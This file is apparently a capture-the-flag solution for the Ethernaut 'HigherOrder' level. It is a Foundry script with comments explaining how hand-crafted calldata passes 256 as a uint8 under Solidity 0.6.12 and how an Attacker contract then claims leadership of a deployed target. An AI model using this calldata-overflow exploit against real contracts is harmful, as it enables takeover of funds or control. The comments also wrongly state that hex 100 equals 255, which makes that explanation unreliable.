// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";

/**
 * Solution
 * 
 * Part 1
 * First we see the solidity version is 0.6.12, most likely there's some catch
 * 
 * =====================================================================================
 * Part 2
 * 
 * There are some opcodes we need to understand what are doing
 * sstore(k, v) -> stores value at a certain slot in storage. "k" will be the slot where value "v will be stored 
 * calldataload(idx) -> loads exactly 32 bytes starting from the specified offset in calldata. "idx" is the offset. 
 * 
 * =====================================================================================
 * Part 3 
 * 
 * We need a way somehow to bypass if (treasury > 255). Which means we have to make treasury bigger than 255.
 * You can see treasury is uint256 which means it can store much bigger numbers than 255. But how can we do that?
 * 
 * The hack to pass the challage is this calldata 
 * 211c85ab0000000000000000000000000000000000000000000000000000000000000100
 * 211c85ab -> is the selector of registerTreasury
 * 0000000000000000000000000000000000000000000000000000000000000100 -> 32 bytes containing the number 256.
 * 100 in hex is 255 in dec.
 * Meaning we actually pass 256 to registerTreasury -> registerTreasury(256). But how is this possible?
 * 
 * =====================================================================================
 * Part 4
 * 
 * The catchy part is if you try to pass the calldata to a contract build using newer version of solidity
 * it's going to revert because uint8 (max n=255) is expected and we are going to pass number 256. But since
 * the Solidity v is 0.6.12 this is possible.
 * 
 * P.S. Honestly I've figured this out by playing in Remix :D
 * 
 * Resources
 * SSTORE -> https://www.youtube.com/watch?v=vTeav5Rinco
 * CALLDATALOAD -> https://ethereum.stackexchange.com/questions/77475/what-data-is-in-calldataload
 */

interface IHigherOrder {
    function commander() external returns(address);
    function treasury() external returns(uint256);
    function claimLeadership() external;
}

contract Attacker {
    IHigherOrder order;
    constructor(address _target) {
        order = IHigherOrder(_target);
        bytes memory callData = hex"211c85ab0000000000000000000000000000000000000000000000000000000000000100";
        (bool success, ) = _target.call(callData);
        require(success, "Unsuccessfull txn");
        order.claimLeadership();
    }
}

contract HigherOrderScript is Script {

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        IHigherOrder higherOrder = IHigherOrder(0x83B3dda4803580fA9f408fc219EeF5BF75E0FA39);

        console.log("commander before", higherOrder.commander());
        console.log("treasury before", higherOrder.treasury());

        new Attacker(0x83B3dda4803580fA9f408fc219EeF5BF75E0FA39);
        
        console.log("commander before", higherOrder.commander());
        console.log("treasury after", higherOrder.treasury());
        
        vm.stopBroadcast();
    }

}